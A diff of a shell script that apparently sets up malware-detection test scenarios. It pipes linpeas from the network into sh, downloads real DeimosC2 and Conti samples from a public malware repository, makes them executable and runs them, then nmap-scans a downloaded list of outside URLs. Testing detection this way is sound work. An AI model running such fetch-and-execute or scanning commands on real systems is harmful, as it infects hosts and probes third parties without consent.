@@ -24,12 +24,11 @@ echo "[+] Download linpeas for fun"
 wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 # SENARIO 2 --- Local Malware 
-echo "Senario 2 - Malware Protection"
+echo "Senario 2 - Malware Protection - Wildfire Analysis"
 # Step 1 - Unix Backdoor Senario 
 echo "[+] Downloading Unixbackdoor Script "
 wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
 chmod 700 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
-sh 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
 sleep 3
 
 # Senario 1.A Local Malware Persisitance 
@@ -48,8 +47,8 @@ sleep 10
 echo "[+] Making unixbackdoor executable"
 chmod 700 unixbackdoor.sh
 # execute 
-echo "[+] Executing the Unix BackDoor"
-05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
+#echo "[+] Executing the Unix BackDoor"
+#05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
 
 # Step 2 - Conti
 echo "[+] Downloading Conti-C2 malware"
@@ -63,10 +62,32 @@ sleep 3
 
 # Step 3 - c2 
 echo "[+] downloading C2 client " 
-wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -0 c2.sh
+wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O c2.sh
 sleep 5
 
 # Make Executable 
+echo "[+] Changing C2 file permissions: executable" 
 chmod 700 c2.sh
 sleep 7
+
+# Exectuion of Malware and Handlening 
+echo "[+] callin malware executables"
+05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || true 
+conti.sh || true 
+c2.sh || true 
+
+# Senario In Progress 
+# Downloading and executing security toolsets 
+apk update 
+apk add --no-cache gcc g++
+apk add --no-cache clang llvm
+
+## donload address list 
+wget https://gist.githubusercontent.com/jgamblin/62fadd8aa321f7f6a482912a6a317ea3/raw/33c6752125188cfdacdeee3f4fd6e01909e50eef/urls.txt -0 url.txt 
+
+### install nmap  
+apk add nmap 
+nmap -iL url.txt 
+
+
 
